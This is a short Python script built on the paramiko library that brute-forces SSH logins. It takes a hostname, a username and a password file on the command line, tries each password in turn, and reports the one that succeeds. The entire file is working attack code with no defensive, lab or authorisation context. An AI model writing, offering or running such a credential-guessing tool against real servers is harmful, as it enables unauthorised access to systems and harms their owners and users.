import paramiko
import sys

def ssh_brute_force(hostname, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            ssh.connect(hostname, username=username, password=password)
            print(f"Success: Password found - {password}")
            return True
        except paramiko.AuthenticationException:
            print(f"Failed: {password}")
        except Exception as e:
            print(f"Error: {str(e)}")
            return False
    return False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python ssh_brute_force.py <hostname> <username> <password_file>")
        sys.exit(1)

    hostname = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]

    with open(password_file, 'r') as file:
        password_list = file.read().splitlines()

    ssh_brute_force(hostname, username, password_list)
